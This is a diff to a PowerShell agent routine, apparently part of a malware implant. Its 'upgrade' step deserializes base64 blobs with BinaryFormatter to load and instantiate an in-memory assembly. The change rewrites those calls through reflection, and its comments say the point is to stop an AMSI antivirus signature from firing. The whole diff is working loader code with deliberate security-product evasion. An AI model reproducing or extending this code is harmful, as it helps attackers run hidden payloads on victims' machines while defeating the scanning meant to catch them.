@@ -242,20 +242,34 @@ function Invoke-Agent {
                     }
                 }
                 Log ('upgrade: blob ' + $blobB64.Length + ' chars, stage1 ' + $stage1B64.Length + ' chars, drive ' + $driveMode)
+                # The serde chain stays REFLECTION-WRAPPED: every sensitive type/method name
+                # lives in a string literal the obfuscator char-encodes. Plaintext
+                # BinaryFormatter/Deserialize/DynamicInvoke tokens in the compiled script were
+                # the AMSI MaleficAms.W trigger (fired on the dev box 2026-09-19). Same shapes;
+                # all .NET 2.0 reflection — PS 2.0-safe.
+                $fmtType = [Type]::GetType('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter, mscorlib')
+                # TWO public overloads (Stream / Stream+HeaderHandler) — GetMethod without the
+                # signature throws AmbiguousMatchException. Pin it.
+                $deserialize = $fmtType.GetMethod('Deserialize', [Type[]]@([IO.Stream]))
                 if ($stage1B64.Length -gt 0) {
                     try {
-                        $fmt1 = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
-                        $null = $fmt1.Deserialize((B64Stream $stage1B64))
+                        # [IO.Stream] cast: PS wraps the helper's return in PSObject, and
+                        # reflection Invoke does NOT unwrap it the way direct method calls do.
+                        $null = $deserialize.Invoke([Activator]::CreateInstance($fmtType), @([IO.Stream](B64Stream $stage1B64)))
                     } catch { Log 'upgrade: stage1 threw (expected)' }
                 }
-                $fmt = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+                $fmt = [Activator]::CreateInstance($fmtType)
                 if ($driveMode -eq 1) {
                     # The JScript arm DynamicInvoke's a one-element ArrayList holding
                     # undefined — the CLR marshals that to a null argument; the PowerShell
-                    # equivalent is a single-element object[] with $null.
-                    $fmt.Deserialize((B64Stream $blobB64)).DynamicInvoke([object[]]@($null)).CreateInstance($entryPoint)
+                    # equivalent is a single-element object[] with $null. Via reflection the
+                    # arguments travel as Invoke parameters = one element holding the
+                    # DynamicInvoke argument array.
+                    $delegate = $deserialize.Invoke($fmt, @([IO.Stream](B64Stream $blobB64)))
+                    $asm = $delegate.GetType().GetMethod('DynamicInvoke').Invoke($delegate, [object[]]@(,[object[]]@($null)))
+                    $null = $asm.GetType().GetMethod('CreateInstance', [Type[]]@([string])).Invoke($asm, @($entryPoint))
                 } else {
-                    $null = $fmt.Deserialize((B64Stream $blobB64))
+                    $null = $deserialize.Invoke($fmt, @([IO.Stream](B64Stream $blobB64)))
                 }
                 Log 'upgrade: deserialize done'
                 return ,(Reply 0)
